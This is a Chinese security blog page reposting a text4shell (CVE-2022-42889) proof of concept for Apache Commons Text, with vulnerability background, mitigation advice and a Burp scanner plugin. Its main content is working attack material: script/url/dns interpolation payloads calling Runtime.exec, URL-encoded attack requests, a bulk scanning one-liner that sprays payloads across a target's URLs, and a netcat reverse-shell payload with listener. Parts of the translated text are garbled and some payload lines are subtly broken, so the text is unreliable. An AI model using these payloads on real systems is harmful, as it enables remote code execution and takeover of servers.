<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
    
    <title>text4shell CVE-2022-42889 poc | 氕氘氚</title>
    <meta name="keywords" content="hexo,theme,otakism,otaku"/>
    <meta name="HandheldFriendly" content="True"/>
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="google-site-verification" content=""/>
    <meta name="baidu-site-verification" content=""/>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="description" content="text4shell CVE-2022-42889 poc 本文转自雨苁 并作补充  漏洞描述 在 Apache Common Text 包 1.5 到 1.9 中发现了一个存在缺陷的代码执行版本。攻击者从 Apache Commons Text 中包含的过程中成功完成，插值可能被动态定义。服务器应用程序会受到影响(RCE) 和不受远程服务器的隐私接触的影响。 Apache Commons Tex">
<meta property="og:type" content="article">
<meta property="og:title" content="text4shell CVE-2022-42889 poc">
<meta property="og:url" content="https://szczecin.github.io/2024/01/23/CVE-2022-42889-Apache-Commons/index.html">
<meta property="og:site_name" content="氕氘氚">
<meta property="og:description" content="text4shell CVE-2022-42889 poc 本文转自雨苁 并作补充  漏洞描述 在 Apache Common Text 包 1.5 到 1.9 中发现了一个存在缺陷的代码执行版本。攻击者从 Apache Commons Text 中包含的过程中成功完成，插值可能被动态定义。服务器应用程序会受到影响(RCE) 和不受远程服务器的隐私接触的影响。 Apache Commons Tex">
<meta property="og:locale">
<meta property="og:image" content="https://szczecin.github.io/2024/01/23/CVE-2022-42889-Apache-Commons/1.png">
<meta property="og:image" content="https://szczecin.github.io/2024/01/23/CVE-2022-42889-Apache-Commons/2.png">
<meta property="og:image" content="https://szczecin.github.io/2024/01/23/CVE-2022-42889-Apache-Commons/3.png">
<meta property="article:published_time" content="2024-01-23T07:36:25.000Z">
<meta property="article:modified_time" content="2024-01-26T08:37:01.540Z">
<meta property="article:author" content="Szczecin">
<meta property="article:tag" content="Reprint">
<meta property="article:tag" content="Exploit">
<meta property="article:tag" content="Apache">
<meta property="article:tag" content="RCE">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://szczecin.github.io/2024/01/23/CVE-2022-42889-Apache-Commons/1.png">
    

    <!-- Favicon -->
    
        <link rel="icon" href="/img/favicon.ico" />
    

    <!-- Font -->
    <link href="https://fonts.googleapis.com/css?family=Inconsolata|Roboto:300,400,700" rel="stylesheet">

    
<link rel="stylesheet" href="/style.css">

    <script>
      function setLoadingBarProgress(num) {
        document.getElementById('loading-bar').style.width = num + "%";
      }
    </script>

    


<meta name="generator" content="Hexo 6.2.0"></head>

<body>

<div id="loading-bar-wrapper">
  <div id="loading-bar"></div>
</div>

<script>setLoadingBarProgress(20)</script>

<div id="site-wrapper">

    <header id="header">
    <div id="header-wrapper" class="clearfix">
        <a id="logo" href="/">
            <img src="/img/logo.png"/>
            <span id="site-desc">
                Be A Gorgeous World
            </span>
        </a>
        <button id="site-nav-switch">
            <span class="icon icon-menu"></span>
        </button>
    </div>
</header>
    <script>setLoadingBarProgress(40);</script>

    <main id="main" role="main">
        <article id="post-CVE-2022-42889-Apache-Commons"
         class="post article white-box article-type-post"
         itemscope itemprop="blogPost">
    <h2 class="title">
        <a href="/2024/01/23/CVE-2022-42889-Apache-Commons/">
            text4shell CVE-2022-42889 poc
        </a>
    </h2>
    <time>
        Jan 23, 2024
    </time>
    <section class="content">
        <div class="article-entry" itemprop="articleBody">
            <h1><span id="text4shell-cve-2022-42889-poc">text4shell CVE-2022-42889 poc</span></h1><blockquote>
<p>本文转自<a target="_blank" rel="noopener" href="https://www.ddosi.org/cve-2022-42889/">雨苁</a> 并作补充</p>
</blockquote>
<h2><span id="漏洞描述">漏洞描述</span></h2><blockquote>
<p>在 Apache Common Text 包 1.5 到 1.9 中发现了一个存在缺陷的代码执行版本。攻击者从 Apache Commons Text 中包含的过程中成功完成，插值可能被动态定义。服务器应用程序会受到影响(RCE) 和不受远程服务器的隐私接触的影响。</p>
<p>Apache Commons Text 执行变量插值，允许动态评估和扩展属性。插值的标准格式是“${prefix:name}”，其中“prefix”用于定位执行插值的 org.apache.commons.text.lookup.StringLookup 的实例。从 1.5 版到 1.9 版，默认 Lookup 实例集包括可能导致任意代码执行或与远程服务器联系的插值器。这些查找是： – “script” – 使用 JVM 脚本执行引擎 (javax.script) 执行表达式 – “dns” – 解析 dns 记录 – “url” – 从 url 加载值，包括来自远程服务器 如果使用了不受信任的配置值，则在受影响的版本中使用插值默认值的应用程序可能容易受到远程代码执行或与远程服务器的无意接触的影响。</p>
<p>建议用户升级到 Apache Commons Text 1.10.0，默认情况下禁用有问题的插值器。</p>
</blockquote>
<h2><span id="影响范围">影响范围</span></h2><blockquote>
<ul>
<li>如果您依赖于使用 1.10.0 之前的 commons-text 版本的软件，您可能仍然不会受到攻击：只有当该软件使用<code>StringSubstitutor</code>API 而没有正确清理任何不受信任的输入时，您才会受到影响。</li>
<li>如果您自己的软件使用 commons-text，请仔细检查它是否使用<code>StringSubstitutor</code>API，而没有正确清理任何不受信任的输入。如果是这样，更新到 1.10.0 可能是一个快速的解决方法，但推荐的解决方案是同时正确验证和清理任何不受信任的输入。</li>
</ul>
<p>Apache Commons Text 是一个低级库，用于执行各种文本操作，例如转义、计算字符串差异以及用通过插值器查找的值替换文本中的占位符。使用字符串替换功能时，一些可用的插值器可以触发网络访问或代码执行。这是有意的，但这也意味着如果应用程序在传递给替换的字符串中包含用户输入而未对其进行适当清理，则攻击者将允许攻击者触发这些插值器。</p>
<p>出于这个原因，Apache Commons Text 团队决定将配置更新为“默认情况下更安全”，从而减轻无法验证输入的影响，并且不会让攻击者访问这些插值器。但是，仍然建议用户谨慎对待不受信任的输入。</p>
<p>我们目前不知道有任何应用程序将不受信任的输入传递给替代者，因此在 Apache Commons Text 1.10.0 之前可能会受到此问题的影响。</p>
<p>此问题与<a target="_blank" rel="noopener" href="https://logging.apache.org/log4j/2.x/security.html">Log4Shell (CVE-2021-44228)</a>不同，因为在 Log4Shell 中，可以从日志消息正文中进行字符串插值，该正文通常包含不受信任的输入。在 Apache Common Text issue 中，相关方法明确用于执行字符串插值并明确记录在案，因此应用程序不太可能在没有适当验证的情况下无意中传递不受信任的输入。</p>
</blockquote>
<h2><span id="漏洞利用条件">漏洞利用条件</span></h2><blockquote>
<p>为了利用这些漏洞，<strong>必须满足以下要求</strong>：</p>
<ul>
<li>运行 1.5 到 1.9 版本的 Apache Commons Text</li>
<li>使用<a target="_blank" rel="noopener" href="https://commons.apache.org/proper/commons-text/apidocs/org/apache/commons/text/StringSubstitutor.html">StringSubstitutor</a>插值器</li>
</ul>
</blockquote>
<h2><span id="cve-2022-42889-poc">CVE-2022-42889 poc</span></h2><blockquote>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;script:javascript:java.lang.Runtime.get.Runtime().exec(\<span class="string">&#x27;&#x27;</span>.trim($cmd).<span class="string">&#x27;\&#x27;)&#125;</span></span><br></pre></td></tr></table></figure>

<p>用有效负载替换参数值：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$&#123;script:javascript:java.lang.Runtime.getRuntime().exec(<span class="string">&#x27;nslookup COLLABORATOR-HERE&#x27;</span>)&#125;</span><br><span class="line"></span><br><span class="line">https:<span class="comment">//your-target.com/exploit?search=%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27nslookup%20COLLABORATOR-HERE%27%29%7</span></span><br></pre></td></tr></table></figure>
</blockquote>
<h3><span id="网址">网址</span></h3><blockquote>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$&#123;url:UTF-<span class="number">8</span>:java.lang.Runtime.getRuntime().exec(<span class="string">&#x27;nslookup COLLABORATOR-HERE&#x27;</span>)&#125;</span><br><span class="line"></span><br><span class="line">https:<span class="comment">//your-target.com/exploit?search=%24%7Burl%3AUTF-8%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27nslookup%20COLLABORATOR-HERE%27%29%7</span></span><br></pre></td></tr></table></figure>
</blockquote>
<h3><span id="dns">Dns</span></h3><blockquote>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$&#123;dns:address:java.lang.Runtime.getRuntime().exec(<span class="string">&#x27;nslookup COLLABORATOR-HERE&#x27;</span>)&#125;</span><br><span class="line"></span><br><span class="line">https:<span class="comment">//your-target.com/exploit?search=%24%7Bdns%3Aaddress%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27nslookup%20COLLABORATOR-HERE%27%29%7</span></span><br></pre></td></tr></table></figure>
</blockquote>
<h3><span id="批量">批量</span></h3><blockquote>
<p><a target="_blank" rel="noopener" href="https://gist.githubusercontent.com/kljunowsky/97479082f50cd9219e80258f698c4d26/raw/7e600767bc59483653a34f17bd426340f28bf086/text4shell-payloads.txt">有效载荷.txt</a></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$&#123;script:javascript:java.lang.Runtime.getRuntime().exec(<span class="string">&#x27;nslookup COLLABORATOR-HERE&#x27;</span>)&#125;</span><br><span class="line"></span><br><span class="line">$&#123;url:UTF-<span class="number">8</span>:java.lang.Runtime.getRuntime().exec(<span class="string">&#x27;nslookup COLLABORATOR-HERE&#x27;</span>)&#125;</span><br><span class="line"></span><br><span class="line">$&#123;dns:address:java.lang.Runtime.getRuntime().exec(<span class="string">&#x27;nslookup COLLABORATOR-HERE&#x27;</span>)&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> payload in $(cat payloads.txt|sed <span class="string">&#x27;s/ COLLABORATOR-HERE/SPACEid.burpcollaborator.com/g&#x27;</span>); <span class="keyword">do</span> echo TARGET.com | gau --blacklist ttf,woff,svg,png | qsreplace <span class="string">&quot;$payload&quot;</span> | sed <span class="string">&#x27;s/SPACE/%20/g&#x27;</span> | grep <span class="string">&quot;java.lang.Runtime.getRuntime&quot;</span> &gt;&gt; payloads-<span class="keyword">final</span>.txt;done &amp;&amp; ffuf -w payloads-<span class="keyword">final</span>.txt -u FUZZ</span><br></pre></td></tr></table></figure>
</blockquote>
<h2><span id="如何利用-cve-2022-42889">如何利用 CVE-2022-42889</span></h2><blockquote>
<p>为了重现攻击，易受攻击的组件部署在 Docker 容器中，可从 EC2 实例访问，该实例将由攻击者控制。使用 netcat (nc) 命令，我们可以打开与易受攻击的应用程序的反向 shell 连接。</p>
<p>易受攻击的 Web 应用程序公开了一个搜索 API，其中查询通过Commons Text 的<em>StringSubstitutor进行插值：</em></p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://web.app/text4shell/attack?search=&lt;query&gt;</span><br></pre></td></tr></table></figure>

<p>以下有效载荷可用于利用该漏洞并打开反弹 shell：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;script:javascript:java.lang.Runtime.getRuntime().exec(<span class="string">&#x27;nc 192.168.49.1 9090 -e /bin/sh&#x27;</span>)&#125;</span><br></pre></td></tr></table></figure>

<p>此有效负载由“${prefix:name}”组成，它触发字符串查找。如上所述，“script”、“dns”和“url”是可以作为前缀来利用漏洞的键。</p>
<p>在发送精心制作的请求之前，我们需要使用 netcat (nc) 命令设置反向 shell 连接以侦听端口 9090</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nlvp 9090</span><br></pre></td></tr></table></figure>

<p>我们现在可以发送精心制作的请求，URL 对有效负载进行编码，如下所示。</p>
<p><img src="/2024/01/23/CVE-2022-42889-Apache-Commons/1.png" alt="image"></p>
<p>我们可以看到攻击者成功打开了与易受攻击的应用程序的连接。</p>
<p><img src="/2024/01/23/CVE-2022-42889-Apache-Commons/2.png" alt="image"></p>
<p>现在攻击者可以以 root 身份与易受攻击的机器交互并执行任意代码。</p>
</blockquote>
<h2><span id="cve-2022-42889-的影响">CVE-2022-42889 的影响</span></h2><blockquote>
<p>根据<a target="_blank" rel="noopener" href="https://sysdig.com/blog/vulnerability-score-cvss-meaning/">CVSSv3 系统，它的</a><strong>CRITICAL 严重性</strong>得分为 9.8 。</p>
<p>由于易于利用以及在机密性、完整性和可用性方面的巨大潜在影响，严重性至关重要。正如我们在上一节中通过精心设计的请求展示的那样，您可以完全控制易受攻击的系统。</p>
<p>但是，<strong>这些漏洞不太可能与之前的 log4shell 和 spring4shell 产生相同的影响。</strong></p>
<p>查看易受攻击的组件，利用的可能性与 Apache Commons Text 库的使用有关。具体来说，<strong>只有当它使用一些用户控制的输入实现 StringSubstitutor 对象时，才有可能利用它。这种在生产环境中的实现不像 Log4j 中易受攻击的字符串替换那样普遍</strong>。因此，Text4Shell 的大规模影响并不能真正与 Log4Shell 相提并论。</p>
</blockquote>
<h2><span id="检测和缓解-cve-2022-42889">检测和缓解 CVE-2022-42889</span></h2><blockquote>
<p>如果您受到<strong>CVE-2022-42889</strong>的影响，您应该将应用程序<strong>Apache Commons Text 更新到版本1.10。</strong></p>
</blockquote>
<h3><span id="burpsuite插件之text4shell漏扫扫描器">burpsuite插件之Text4Shell漏扫扫描器</span></h3><h4><span id="项目地址">项目地址:</span></h4><blockquote>
<p>GitHub:<br><a target="_blank" rel="noopener" href="https://github.com/silentsignal/burp-text4shell">https://github.com/silentsignal/burp-text4shell</a></p>
<p><img src="/2024/01/23/CVE-2022-42889-Apache-Commons/3.png" alt="image"></p>
</blockquote>
<h4><span id="插件下载地址">插件下载地址:</span></h4><blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/silentsignal/burp-text4shell/releases/download/v0.1/burp-text4shell.jar">burp-text4shell.jar</a></p>
</blockquote>
<h4><span id="单问题扫描">单问题扫描</span></h4><blockquote>
<p>关于检测功能的注意事项：此插件只会为内置的主动扫描器提供有效负载，因此为了获得最佳覆盖率与性能，您必须正确配置扫描 – 就像任何其他内置或扩展提供的扫描一样.</p>
<p>如果您只想扫描 CVE-2022-42889（而不是 XSS 或 SQLi 等其他东西），这个插件可以实现。</p>
<p>按照以下说明，如果使用作为结果创建的扫描配置，扫描仪将仅对所有插入点执行 Text4Shell 检查。</p>
<ol>
<li>创建新扫描时，单击<code>Select from library</code>选项<code>Scan configuration</code>卡</li>
<li>选择<code>Audit checks - extensions only</code>Burp Suite Pro 2.x 中内置的</li>
<li>禁用所有其他已注册活动扫描检查的扩展程序（如果适用）（例如 ActiveScan++、反斜杠驱动扫描、Burp Bounty 等），以便仅运行 Text4Shell 扫描程序</li>
</ol>
</blockquote>
<h4><span id="建造">建造</span></h4><blockquote>
<p> 执行<code>./gradlew build</code>，您将准备好插件 <code>build/libs/burp-text4shell.jar</code></p>
</blockquote>

        </div>
        <div class="article-tags tags">
            
                <a class="tag-none-link" href="/tags/Apache/" rel="tag">Apache</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
            
        </div>
    </section>
</article>





        <script>setLoadingBarProgress(60);</script>
    </main>

    <footer id="footer" class="clearfix">

    

    <div class="social-wrapper">
        
            
                <a href="https://github.com/szczecin" class="social github"
                   target="_blank" rel="external">
                    <span class="icon icon-github"></span>
                </a>
            
                <a href="/atom.xml" class="social rss"
                   target="_blank" rel="external">
                    <span class="icon icon-rss"></span>
                </a>
            
        
    </div>

    <div class="theme-by">Theme <span class="codename">Memory</span> designed by <a href="https://artifact.me/"
                                                                                    target="_blank">Art Chen</a>.
    </div>
    <div>&copy; <a href="/">氕氘氚</a></div>

</footer>


    <script>setLoadingBarProgress(80);</script>
    <div class="overlay"></div>
</div>

<div class="site-sidebar" id="site-sidebar">

    

    <div class="sidebar-switch clearfix "
         style="display: none">
        <a class="dark-btn active" data-toggle="toc">
            <span class="icon icon-list"></span>
            <span class="text">Index</span>
        </a>
        <a class="dark-btn" data-toggle="bio">
            <span class="icon icon-person"></span>
            <span class="text">Bio</span>
        </a>
    </div>

    <div class="site-toc "
         style="display: none">
        
            <div class="no-index">No Index</div>
        
    </div>

    <div class="site-bio show"
         style="display: block">

        <div class="about-me clearfix">
            <div class="avatar">
                <img src="/img/avatar.png"/>
            </div>
            <div class="info">
                <a class="name dark-btn" href="/about">
                    Szczecin
                </a>
            </div>
            <div class="info">
                <span class="item desc">
                    Open your eyes to see the light in life
                </span>
            </div>
        </div>

        <div class="menu section">
            <ul class="clearfix">
                
                    <li class="left">
                        <a href="/about"
                           onfocus="this.blur();"
                           class="nav-about dark-btn block">
                            简介
                        </a>
                    </li>
                
                    <li class="right">
                        <a href="/archives"
                           onfocus="this.blur();"
                           class="nav-archives dark-btn block">
                            归档
                        </a>
                    </li>
                
                    <li class="left">
                        <a href="/categories"
                           onfocus="this.blur();"
                           class="nav-categories dark-btn block">
                            分类
                        </a>
                    </li>
                
                    <li class="right">
                        <a href="/tags"
                           onfocus="this.blur();"
                           class="nav-tags dark-btn block">
                            TAGs
                        </a>
                    </li>
                
                    <li class="left">
                        <a href="/WriteUP"
                           onfocus="this.blur();"
                           class="nav-WriteUP dark-btn block">
                            WriteUP
                        </a>
                    </li>
                
                    <li class="right">
                        <a href="/EXP"
                           onfocus="this.blur();"
                           class="nav-EXP dark-btn block">
                            EXP
                        </a>
                    </li>
                
                    <li class="left">
                        <a href="/tags/SRC"
                           onfocus="this.blur();"
                           class="nav-SRC dark-btn block">
                            SRC
                        </a>
                    </li>
                
                    <li class="right">
                        <a href="/Life"
                           onfocus="this.blur();"
                           class="nav-Life dark-btn block">
                            Life
                        </a>
                    </li>
                
            </ul>
        </div>

    </div>

    <div class="shortcuts">
        <a href="#header" class="top window-nav dark-btn" id="go-top">
            <span class="icon icon-chevron-thin-up"></span>
        </a>
        <a class="close dark-btn" id="sidebar-close">
            <span class="icon icon-close"></span>
        </a>
        <a href="#footer" class="top window-nav dark-btn" id="go-bottom">
            <span class="icon icon-chevron-thin-down"></span>
        </a>
    </div>

</div>





<script src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
<script>window.jQuery || document.write('<script src="/js/jquery.min.js"><\/script>')</script>


<script src="/js/jquery.fitvids.js"></script>

<script>
  var GOOGLE_CUSTOM_SEARCH_API_KEY = "";
  var GOOGLE_CUSTOM_SEARCH_ENGINE_ID = "";
  var ALGOLIA_API_KEY = "";
  var ALGOLIA_APP_ID = "";
  var ALGOLIA_INDEX_NAME = "";
  var AZURE_SERVICE_NAME = "";
  var AZURE_INDEX_NAME = "";
  var AZURE_QUERY_KEY = "";
  var SEARCH_SERVICE = "";
  var universalSearchConfig = {};
  if (SEARCH_SERVICE === 'google') {
    universalSearchConfig = {
      searchService: SEARCH_SERVICE,
      apiKey: GOOGLE_CUSTOM_SEARCH_API_KEY,
      engineId: GOOGLE_CUSTOM_SEARCH_ENGINE_ID,
      imagePath: "/img/"
    };
  } else if (SEARCH_SERVICE === 'algolia') {
    universalSearchConfig = {
      searchService: SEARCH_SERVICE,
      apiKey: ALGOLIA_API_KEY,
      appId: ALGOLIA_APP_ID,
      indexName: ALGOLIA_INDEX_NAME,
      imagePath: "/img/"
    };
  } else if (SEARCH_SERVICE === 'azure') {
    universalSearchConfig = {
      searchService: SEARCH_SERVICE,
      serviceName: AZURE_SERVICE_NAME,
      indexName: AZURE_INDEX_NAME,
      apiKey: AZURE_QUERY_KEY,
      imagePath: "/img/"
    };
  }
</script>

<script src="/js/app.js"></script>


<script src="/js/search.js"></script>





<script>setLoadingBarProgress(100);</script>

</body>
</html>
